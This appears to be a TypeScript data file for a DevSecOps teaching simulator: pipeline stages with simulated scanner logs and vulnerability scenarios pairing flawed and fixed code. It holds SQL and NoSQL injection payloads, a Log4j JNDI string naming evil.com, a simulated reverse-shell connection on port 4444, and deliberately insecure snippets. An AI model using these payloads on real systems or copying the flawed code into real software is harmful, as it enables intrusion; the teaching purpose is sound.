import { PipelineStage, VulnerabilityScenario } from '../types';

export const PIPELINE_STAGES: PipelineStage[] = [
  {
    id: 'stage-precommit',
    number: 1,
    name: 'Secret & Credential Scan',
    shortName: 'Secret Scan',
    category: 'code',
    toolUsed: 'GitLeaks & TruffleHog',
    analogy: 'Airport Metal Detector at the Departure Gate',
    description:
      'Scans every code commit, git history, and config file to detect accidentally pasted passwords, AWS tokens, private SSH keys, and API secrets BEFORE they leave the developer’s laptop.',
    whatItChecks: [
      'Regex patterns for AWS, GitHub, Stripe, and Database API keys',
      'High-entropy string detection (cryptographic secrets)',
      'Unencrypted `.env` files staged for commit',
    ],
    terminalLogPassing: [
      '[INFO] Initializing GitLeaks v8.18.2...',
      '[SCAN] Analyzing 12 files across commit hash 8f4a12b...',
      '[CHECK] Inspecting src/services/auth.ts for secret entropy: OK',
      '[CHECK] Inspecting .env.example: Safe placeholder variables found',
      '[RESULT] 0 secrets detected. Git pre-commit hook passed.',
    ],
    terminalLogFailing: [
      '[INFO] Initializing GitLeaks v8.18.2...',
      '[SCAN] Analyzing 12 files across commit hash 8f4a12b...',
      '[CRITICAL-ALERT] High-entropy secret detected!',
      '  File: src/services/paymentService.ts:14',
      '  Rule: aws-access-key-id (Severity: HIGH)',
      '  Pattern Match: "AKIAIOSFODNN7EXAMPLE"',
      '[FATAL] Hardcoded credentials in source control violate ISO-27001 & SOC-2 compliance.',
      '[PIPELINE HALTED] Commit rejected at Gate 1.',
    ],
  },
  {
    id: 'stage-sast',
    number: 2,
    name: 'Static Application Security Testing (SAST)',
    shortName: 'SAST Scan',
    category: 'build',
    toolUsed: 'SonarQube & Semgrep',
    analogy: 'Architectural Blueprint Structural Integrity X-Ray',
    description:
      'Inspects raw source code without running it. It parses the Abstract Syntax Tree (AST) to spot code smells, security vulnerabilities (SQL Injection, XSS, insecure deserialization, buffer overflows), and poor engineering practices.',
    whatItChecks: [
      'Untrusted user input fed into database queries without parameterization (SQLi)',
      'DOM innerHTML assignments without HTML sanitization (XSS)',
      'Weak cryptographic hashing algorithms (MD5, SHA1 instead of bcrypt/Argon2)',
      'Hardcoded file paths and directory traversal risks',
    ],
    terminalLogPassing: [
      '[INFO] SonarScanner CLI starting...',
      '[AST] Parsed 4,210 lines of TypeScript & Go code into AST',
      '[RULES] Executing 148 OWASP Top-10 security rules...',
      '[ANALYSIS] SQL Query Sanitization: 100% Parameterized',
      '[ANALYSIS] Cryptographic functions: Argon2id v13 verified',
      '[QUALITY GATE] Rating: A | Vulnerabilities: 0 | Security Hotspots: 0',
      '[RESULT] SAST Gate passed successfully.',
    ],
    terminalLogFailing: [
      '[INFO] SonarScanner CLI starting...',
      '[AST] Parsed 4,210 lines of TypeScript & Go code into AST',
      '[RULES] Executing 148 OWASP Top-10 security rules...',
      '[CRITICAL-ALERT] CWE-89: SQL Injection detected in database layer!',
      '  File: src/controllers/userController.ts:42',
      '  Taint Flow: req.body.email -> query string concatenation -> db.query()',
      '  Sink: "SELECT * FROM users WHERE email = \'" + req.body.email + "\'"',
      '[FATAL] Raw string interpolation allows arbitrary SQL execution by external clients.',
      '[PIPELINE HALTED] Security Quality Gate Failed (Score: F).',
    ],
  },
  {
    id: 'stage-sca',
    number: 3,
    name: 'Software Composition Analysis (SCA)',
    shortName: 'Dependency Scan',
    category: 'deps',
    toolUsed: 'Snyk & Dependabot',
    analogy: 'Food Safety Inspector Checking Expiry Dates & Recalls',
    description:
      'Modern apps are 80% open-source packages from npm, PyPI, or Maven. SCA inspects `package-lock.json` against the National Vulnerability Database (NVD) to spot known CVEs and malicious supply-chain packages.',
    whatItChecks: [
      'Known CVEs (Common Vulnerabilities and Exposures) in transitive dependencies',
      'Malicious packages hijacked by attackers or typosquatting',
      'Legal license compliance (e.g. flagging accidental GPL-3 in proprietary code)',
    ],
    terminalLogPassing: [
      '[INFO] Snyk CLI v1.1293.0 scanning dependencies...',
      '[INDEX] Parsed package-lock.json (342 total dependencies)',
      '[QUERY] Querying Snyk Vulnerability Database for known CVEs...',
      '[CHECK] direct dependencies: 24 scanned, 0 vulnerable',
      '[CHECK] transitive dependencies: 318 scanned, 0 vulnerable',
      '[RESULT] Zero vulnerabilities found. SCA Gate passed.',
    ],
    terminalLogFailing: [
      '[INFO] Snyk CLI v1.1293.0 scanning dependencies...',
      '[INDEX] Parsed package-lock.json (342 total dependencies)',
      '[CRITICAL-ALERT] Critical Security Vulnerability Found!',
      '  Package: jsonwebtoken@8.5.1',
      '  Vulnerability: CVE-2022-23529 (CVSS Score: 9.8 Critical)',
      '  Issue: Insecure key verification allows arbitrary remote code execution (RCE)',
      '  Remediation: Upgrade jsonwebtoken to version 9.0.0 or higher',
      '[FATAL] Production build cannot contain dependencies with CVSS >= 7.0.',
      '[PIPELINE HALTED] Supply chain security check rejected.',
    ],
  },
  {
    id: 'stage-container',
    number: 4,
    name: 'Container & Infrastructure as Code (IaC) Scan',
    shortName: 'Container & IaC',
    category: 'container',
    toolUsed: 'Trivy & Checkov',
    analogy: 'Vehicle Safety & Crash-Test Inspection Before Road Travel',
    description:
      'Scans Dockerfile, base container images, and Terraform infrastructure code. Verifies that the container is not running as the Linux `root` user, base OS packages are patched, and cloud firewalls do not expose private ports.',
    whatItChecks: [
      'Linux root user execution (`USER root` vs `USER nonroot`)',
      'OS-level library CVEs inside Ubuntu/Alpine base images',
      'Terraform security group rules allowing `0.0.0.0/0` on SSH port 22',
      'Unencrypted AWS S3 bucket declarations in Terraform',
    ],
    terminalLogPassing: [
      '[INFO] Trivy scanning container image: mega-app:8f4a12b...',
      '[IMAGE] Base image: cgr.dev/chainguard/node:latest (Distroless)',
      '[CHECK] OS packages: 0 known vulnerabilities',
      '[CHECK] Container user: UID 65532 (nonroot) verified',
      '[INFO] Checkov scanning terraform/infra/*.tf...',
      '[IAC] Checked 18 cloud resources: 0 misconfigurations found',
      '[RESULT] Container & IaC Security Gate passed.',
    ],
    terminalLogFailing: [
      '[INFO] Trivy scanning container image: mega-app:8f4a12b...',
      '[CRITICAL-ALERT] Insecure Container Configuration & OS Vulnerability!',
      '  Dockerfile: Insecure USER root detected (Rule: CKV_DOCKER_3)',
      '  Risk: Container escape allows host root compromise',
      '[INFO] Checkov scanning terraform/infra/*.tf...',
      '  File: terraform/security_groups.tf:12',
      '  Failed Check: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0 to port 22"',
      '[FATAL] Public SSH access and root containers violate CIS Benchmarks.',
      '[PIPELINE HALTED] Container and Infrastructure security rejected.',
    ],
  },
  {
    id: 'stage-dast',
    number: 5,
    name: 'Dynamic Application Security Testing (DAST)',
    shortName: 'DAST Probe',
    category: 'test',
    toolUsed: 'OWASP ZAP & Burp Suite',
    analogy: 'Friendly White-Hat Hacker Poking the Front Door',
    description:
      'Unlike SAST (which reads source code), DAST attacks the running application on an isolated staging server like an external hacker. It throws thousands of weird requests, fuzzes endpoints, checks headers, and looks for crash leaks.',
    whatItChecks: [
      'Missing HTTP security headers (HSTS, Content-Security-Policy, X-Frame-Options)',
      'Verbose error responses that leak internal database table names or stack traces',
      'Cookie attributes missing `Secure`, `HttpOnly`, and `SameSite=Strict`',
      'Unauthenticated access to internal administrative routes (`/admin/debug`)',
    ],
    terminalLogPassing: [
      '[INFO] OWASP ZAP automated scanner attacking https://staging.mega-app.internal...',
      '[SPIDER] Discovered 38 API endpoints and forms',
      '[ATTACK] Executing active attack rules: Fuzzing, SQLi probes, XSS payloads...',
      '[HEADERS] Strict-Transport-Security: max-age=31536000 verified',
      '[HEADERS] Content-Security-Policy: present and valid',
      '[COOKIE] session_id cookie has Secure; HttpOnly; SameSite=Strict',
      '[RESULT] 0 High/Medium alerts. DAST Dynamic Gate passed.',
    ],
    terminalLogFailing: [
      '[INFO] OWASP ZAP automated scanner attacking https://staging.mega-app.internal...',
      '[SPIDER] Discovered 38 API endpoints and forms',
      '[CRITICAL-ALERT] Information Leakage & Unhandled Exception Detected!',
      '  Endpoint: POST /api/v1/checkout/apply-coupon',
      '  Payload: {"couponCode": {"$gt": ""}}',
      '  Response HTTP 500: Leaked PostgreSQL database connection string and server filesystem path!',
      '  Issue: Unauthenticated access to /internal/metrics exposed without API token',
      '[FATAL] Production cannot leak stack traces or internal endpoints to public callers.',
      '[PIPELINE HALTED] DAST Penetration test failed.',
    ],
  },
  {
    id: 'stage-canary',
    number: 6,
    name: 'Canary Deployment & Automated Rollback Gate',
    shortName: 'Canary Gate',
    category: 'deploy',
    toolUsed: 'ArgoCD & Kubernetes Flagger',
    analogy: 'Canary Bird in the Coal Mine / Phased Flight Boarding',
    description:
      'Instead of throwing new code to 100% of users at once (which causes massive outages), the new version is routed to just 5% of real traffic. Automated probes monitor HTTP 500 error rates and response latency for 5 minutes. If healthy, it increases to 25%, then 50%, then 100%. If errors spike, it rolls back in 2 seconds!',
    whatItChecks: [
      'HTTP 5xx error rate remains < 0.01% on the new release',
      'P99 request latency remains < 120ms (no performance regression)',
      'Synthetic health probes respond with HTTP 200 OK',
      'Zero unhandled crashes in container pods',
    ],
    terminalLogPassing: [
      '[INFO] ArgoCD synchronizing Kubernetes cluster manifests...',
      '[CANARY] Deploying revision v2.4.1 to Canary Pods (5% traffic weight)...',
      '[METRICS] Monitoring Prometheus metrics for 300 seconds...',
      '  Traffic 5%: Error rate: 0.002% | P99 latency: 68ms (HEALTHY)',
      '  Traffic 25%: Error rate: 0.003% | P99 latency: 71ms (HEALTHY)',
      '  Traffic 50%: Error rate: 0.002% | P99 latency: 69ms (HEALTHY)',
      '  Traffic 100%: Promotion completed. Old version v2.4.0 gracefully drained.',
      '[SUCCESS] Production deployment verified and live with ZERO downtime!',
    ],
    terminalLogFailing: [
      '[INFO] ArgoCD synchronizing Kubernetes cluster manifests...',
      '[CANARY] Deploying revision v2.4.1 to Canary Pods (5% traffic weight)...',
      '[METRICS] Monitoring Prometheus metrics for 60 seconds...',
      '[CRITICAL-ALERT] Canary health metric breached threshold!',
      '  HTTP 500 Error Rate jumped to 4.8% (Maximum allowed threshold: 0.1%)',
      '  Pod status: Memory leak detected in worker container (OOMKilled)',
      '[AUTOMATED-ROLLBACK] Kubernetes Flagger instantly shifting 100% traffic back to stable v2.4.0!',
      '[SAFEGUARD] Zero customer impact. Faulty canary isolated and terminated.',
      '[PIPELINE HALTED] Deployment aborted automatically by Prometheus alert gate.',
    ],
  },
  {
    id: 'stage-runtime',
    number: 7,
    name: 'Runtime Defense & Continuous Observability',
    shortName: 'Runtime Defense',
    category: 'monitor',
    toolUsed: 'Datadog, Falco & AWS GuardDuty',
    analogy: 'CCTV Surveillance Room & 24/7 Security Patrol',
    description:
      'Security does not stop after deployment! Runtime defense monitors Linux kernel system calls inside the running containers. If an attacker discovers a brand new zero-day exploit and tries to spawn a bash shell or download crypto-mining software, Falco kills the container within 50 milliseconds.',
    whatItChecks: [
      'Unexpected process spawned inside container (e.g. `/bin/bash` or `/bin/sh`)',
      'Outbound network connection to known crypto-mining IP pools',
      'Unauthorized file modification in `/etc` or `/bin`',
      'API rate anomalies and distributed credential stuffing attempts',
    ],
    terminalLogPassing: [
      '[INFO] Runtime agent active on 64 worker nodes...',
      '[KERNEL] Falco eBPF probe monitoring system call events: 450,000 syscalls/sec',
      '[WAF] AWS WAF active: 1,420 malicious bot requests blocked in last hour',
      '[STATUS] All runtime health metrics optimal. Threat level: GREEN',
      '[SUMMARY] Entire DevSecOps automated lifecycle operating with high assurance.',
    ],
    terminalLogFailing: [
      '[INFO] Runtime agent active on 64 worker nodes...',
      '[CRITICAL-ALERT] Falco Rule Triggered: Spawned terminal process in container!',
      '  Process: /bin/bash (Parent: node index.js, PID: 4892)',
      '  Container: order-service-canary-6b99c7f7',
      '  Event: Outbound connection attempted to unknown IP: 198.51.100.42:4444',
      '[DEFENSE ACTION] Isolating pod network interface...',
      '[DEFENSE ACTION] Terminating compromised container pod immediately.',
      '[ALERT] Security Operations Center (SOC) alerted via PagerDuty incident #SEC-9842.',
    ],
  },
];

export const VULNERABILITY_SCENARIOS: VulnerabilityScenario[] = [
  {
    id: 'clean-build',
    title: 'Golden Standard: Pristine Clean Build',
    stageId: 'none',
    category: 'Production Ready',
    freshmanMistake: 'None! This follows all enterprise best practices.',
    realWorldDisaster: 'Everything operates smoothly. Millions of users checkout without any data leak or outage.',
    flawedCodeSnippet: {
      fileName: 'src/services/paymentService.ts',
      code: `// Secure clean code using environment secrets and parameterized queries
export async function processPayment(orderId: string, amount: number) {
  const apiKey = process.env.STRIPE_SECRET_KEY; // Loaded securely from Vault/KMS
  if (!apiKey) throw new Error("Missing credentials");

  // Parameterized SQL query preventing SQL Injection
  const result = await db.query(
    "UPDATE orders SET status = $1 WHERE id = $2 RETURNING *",
    ["PAID", orderId]
  );
  return result.rows[0];
}`,
      highlightLine: 2,
    },
    fixedCodeSnippet: {
      fileName: 'src/services/paymentService.ts',
      code: `// Production-hardened implementation
export async function processPayment(orderId: string, amount: number) {
  const apiKey = process.env.STRIPE_SECRET_KEY;
  if (!apiKey) throw new Error("Missing credentials");

  const result = await db.query(
    "UPDATE orders SET status = $1 WHERE id = $2 RETURNING *",
    ["PAID", orderId]
  );
  return result.rows[0];
}`,
      explanation: 'Code uses runtime secrets from environment, parameterized queries, and proper error boundaries.',
    },
    remediationGuide: 'No remediation needed. Run the pipeline to witness a 100% green automated deployment!',
  },
  {
    id: 'secret-leak',
    title: 'Hardcoded AWS Secret Key in Git Commit',
    stageId: 'stage-precommit',
    category: 'Secret Exposure',
    freshmanMistake:
      'A student testing an S3 upload pastes their live AWS Access Key directly into the TypeScript file, thinking "I\'ll remove it before pushing to GitHub!" Then they forget and commit it.',
    realWorldDisaster:
      'Automated hacker bots scrape public GitHub repos within 2 seconds of pushing. In 2021, an engineer leaked credentials and woke up to a $65,000 AWS bill because hackers spun up 1,000 crypto-mining GPU servers.',
    flawedCodeSnippet: {
      fileName: 'src/services/paymentService.ts',
      code: `// DANGEROUS: Developer hardcoded AWS credentials directly in code!
import { S3Client } from "@aws-sdk/client-s3";

const s3 = new S3Client({
  region: "us-east-1",
  credentials: {
    accessKeyId: "AKIAIOSFODNN7EXAMPLE",
    secretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // LEAKED SECRET!
  }
});`,
      highlightLine: 8,
    },
    fixedCodeSnippet: {
      fileName: 'src/services/paymentService.ts',
      code: `// SECURE: Use AWS IAM Roles or environment variables from secret manager
import { S3Client } from "@aws-sdk/client-s3";

// In production, AWS SDK automatically retrieves temporary IAM credentials
// from the EC2/EKS metadata service or AWS Secrets Manager.
const s3 = new S3Client({
  region: process.env.AWS_REGION || "us-east-1",
});`,
      explanation:
        'Never hardcode keys! Use AWS IAM Roles (Instance Profiles) or fetch short-lived tokens from AWS Secrets Manager or HashiCorp Vault.',
    },
    remediationGuide:
      'Step 1: Revoke the leaked secret immediately in AWS IAM console. Step 2: Rewrite code to read from environment or IAM profile. Step 3: Run git-filter-repo to scrub history.',
  },
  {
    id: 'sast-sqli',
    title: 'SQL Injection via String Concatenation',
    stageId: 'stage-sast',
    category: 'Code Vulnerability',
    freshmanMistake:
      'Writing SQL by stitching strings together: `"SELECT * FROM users WHERE email = \'" + email + "\'"` because it feels simple and natural.',
    realWorldDisaster:
      'An attacker enters `admin@company.com\' OR 1=1--` into the email box. The database interprets `OR 1=1` as always true, logging the attacker in as the Super Admin! Or even worse: `admin\'; DROP TABLE orders;--`.',
    flawedCodeSnippet: {
      fileName: 'src/controllers/userController.ts',
      code: `// VULNERABLE: Direct string concatenation creates SQL Injection (CWE-89)
export async function getUserByEmail(req: Request, res: Response) {
  const userEmail = req.body.email;

  // DANGER: Malicious payload in userEmail can alter SQL command structure!
  const query = "SELECT * FROM users WHERE email = '" + userEmail + "'";
  const result = await db.rawQuery(query);
  
  res.json(result);
}`,
      highlightLine: 6,
    },
    fixedCodeSnippet: {
      fileName: 'src/controllers/userController.ts',
      code: `// SECURE: Use Parameterized Queries (Prepared Statements)
export async function getUserByEmail(req: Request, res: Response) {
  const userEmail = req.body.email;

  // SAFE: The database treats userEmail strictly as raw string data, never executable code!
  const query = "SELECT id, name, email FROM users WHERE email = $1";
  const result = await db.query(query, [userEmail]);
  
  res.json(result.rows);
}`,
      explanation:
        'Prepared statements send SQL query template and user values through separate channels. Even if the user inputs SQL commands, the database driver escapes them safely.',
    },
    remediationGuide:
      'Replace all string interpolations with parameterized query arguments (`$1`, `?`) or use a type-safe ORM like Drizzle, Prisma, or Hibernate.',
  },
  {
    id: 'sca-cve',
    title: 'Critical Remote Code Execution CVE in Dependencies',
    stageId: 'stage-sca',
    category: 'Supply Chain CVE',
    freshmanMistake:
      'Running `npm install` on an old tutorial repository and keeping ancient dependencies pinned without regular security auditing.',
    realWorldDisaster:
      'The infamous Log4j vulnerability (CVE-2021-44228) allowed hackers to take over Fortune 500 servers simply by sending a text message containing `${jndi:ldap://evil.com}`. In our case, `jsonwebtoken@8.5.1` has a critical RCE flaw (CVE-2022-23529).',
    flawedCodeSnippet: {
      fileName: 'package.json',
      code: `{
  "name": "enterprise-order-service",
  "dependencies": {
    "express": "^4.18.2",
    "jsonwebtoken": "8.5.1", // VULNERABLE: Known CVE-2022-23529 (CVSS 9.8 Critical!)
    "pg": "^8.11.0"
  }
}`,
      highlightLine: 5,
    },
    fixedCodeSnippet: {
      fileName: 'package.json',
      code: `{
  "name": "enterprise-order-service",
  "dependencies": {
    "express": "^4.18.2",
    "jsonwebtoken": "^9.0.2", // PATCHED: Secure patched version
    "pg": "^8.11.0"
  }
}`,
      explanation:
        'Updating to `jsonwebtoken >= 9.0.0` patches the unauthenticated verification flaw and enforces secure cryptographic signature checks.',
    },
    remediationGuide:
      'Run `npm audit fix` or upgrade package versions via Dependabot / Renovate PRs. Set CI security quality gate to fail builds on CVSS >= 7.0.',
  },
  {
    id: 'container-root',
    title: 'Container Running as Root with Host Ingress Open',
    stageId: 'stage-container',
    category: 'Infrastructure Risk',
    freshmanMistake:
      'Writing a simple 4-line Dockerfile without setting a non-root user, and opening AWS security groups to `0.0.0.0/0` so "it just works and I don\'t get connection refused".',
    realWorldDisaster:
      'If an attacker finds a minor vulnerability in your Node.js app, because the container runs as Linux `root`, they can exploit a container escape kernel bug, break out onto the physical AWS EC2 host, and compromise all other tenant databases!',
    flawedCodeSnippet: {
      fileName: 'Dockerfile & terraform/sg.tf',
      code: `# VULNERABLE DOCKERFILE
FROM node:18-alpine
WORKDIR /app
COPY . .
RUN npm install
# DANGER: No USER specified! Default is root (UID 0)!
CMD ["node", "server.js"]

# VULNERABLE TERRAFORM
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"] # DANGER: Open to entire internet!
}`,
      highlightLine: 6,
    },
    fixedCodeSnippet: {
      fileName: 'Dockerfile & terraform/sg.tf',
      code: `# SECURE DOCKERFILE (Principle of Least Privilege)
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
# Run as non-privileged unprivileged user
USER node
EXPOSE 3000
CMD ["node", "server.js"]

# SECURE TERRAFORM: No public SSH! Use AWS SSM Session Manager
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 443
  to_port     = 443
  protocol    = "tcp"
  cidr_blocks = ["10.0.0.0/16"] # Restricted to internal VPC CIDR only
}`,
      explanation:
        'Always drop root privileges (`USER node` or distroless images) and never expose port 22 to the public internet.',
    },
    remediationGuide:
      'Configure Checkov in CI to block any Terraform security group permitting `0.0.0.0/0` on management ports, and use Trivy to enforce non-root Docker builds.',
  },
  {
    id: 'canary-memory-leak',
    title: 'Staging Memory Leak & 500 Spike on Canary Deployment',
    stageId: 'stage-canary',
    category: 'Canary Failure',
    freshmanMistake:
      'Pushing an unclosed WebSocket connection loop or un-garbage-collected array cache into production without canary error rate monitoring.',
    realWorldDisaster:
      'If deployed to 100% of servers at once, all servers crash simultaneously within 3 minutes of traffic load, causing a company-wide Black Friday outage.',
    flawedCodeSnippet: {
      fileName: 'src/services/notificationService.ts',
      code: `// BUG: Unbounded in-memory array never gets cleared!
const activeSockets: WebSocket[] = [];

export function registerClient(ws: WebSocket) {
  // Memory leak: Every client connection is stored indefinitely!
  // Under 5,000 requests/sec, Node process exceeds 1.5GB RAM and crashes (OOMKilled)!
  activeSockets.push(ws);
}`,
      highlightLine: 6,
    },
    fixedCodeSnippet: {
      fileName: 'src/services/notificationService.ts',
      code: `// SECURE: Use Redis Pub/Sub for distributed state and auto-cleanup
import { createClient } from "redis";

const redisPub = createClient({ url: process.env.REDIS_URL });

export function registerClient(ws: WebSocket, clientId: string) {
  ws.on("close", () => {
    // Graceful garbage collection when connection drops
    cleanupClient(clientId);
  });
}`,
      explanation:
        'Stateless microservices should offload shared state to Redis or RabbitMQ so container pods remain lightweight and never run out of memory.',
    },
    remediationGuide:
      'The Canary Gate catches this early: it routes 5% of traffic, detects pod restarts and 500 spikes, and rolls back before any real user feels the outage.',
  },
  {
    id: 'wiz-toxic-combination',
    title: 'Wiz Toxic Combination: Public Port + Admin IAM Role',
    stageId: 'stage-container',
    category: 'Cloud CSPM Alert',
    freshmanMistake:
      'Attaching an overly permissive IAM role (`AdministratorAccess`) to an EC2 instance or Kubernetes pod to "fix permission denied errors quickly" while keeping port 80 exposed.',
    realWorldDisaster:
      'Wiz detects this critical multi-hop attack vector: An internet attacker who compromises the web service can query the AWS metadata IP (169.254.169.254), steal the Administrator IAM credentials, and gain full control of all enterprise cloud accounts.',
    flawedCodeSnippet: {
      fileName: 'terraform/iam_and_ec2.tf',
      code: `# DANGEROUS: Toxic Combination flagged by Wiz!
resource "aws_iam_role_policy_attachment" "overly_permissive" {
  role       = aws_iam_role.web_service.name
  # DANGER: Gives full admin to the entire AWS organization!
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_security_group_rule" "public_http" {
  type        = "ingress"
  from_port   = 80
  to_port     = 80
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"] # Directly reachable by any internet hacker
}`,
      highlightLine: 5,
    },
    fixedCodeSnippet: {
      fileName: 'terraform/iam_and_ec2.tf',
      code: `# SECURE: Principle of Least Privilege + Internal WAF
resource "aws_iam_policy" "scoped_down" {
  name = "web_service_least_privilege"
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:GetObject"] # Read-only, single specific bucket
      Resource = "arn:aws:s3:::megacorp-public-assets/*"
    }]
  })
}

# Route traffic through Cloudflare/WAF rather than direct open port
resource "aws_security_group_rule" "restricted_alb" {
  type                     = "ingress"
  from_port                = 80
  to_port                  = 80
  protocol                 = "tcp"
  source_security_group_id = aws_security_group.load_balancer.id
}`,
      explanation:
        'Wiz agentless graph scanning verifies that even if the web service has a bug, the IAM role only allows reading public assets, preventing lateral movement into internal databases.',
    },
    remediationGuide:
      'Scope down IAM policies with AWS IAM Access Analyzer or Wiz remediation, remove wildcard permissions (`*`), and route traffic through an Application Load Balancer with WAF.',
  },
];

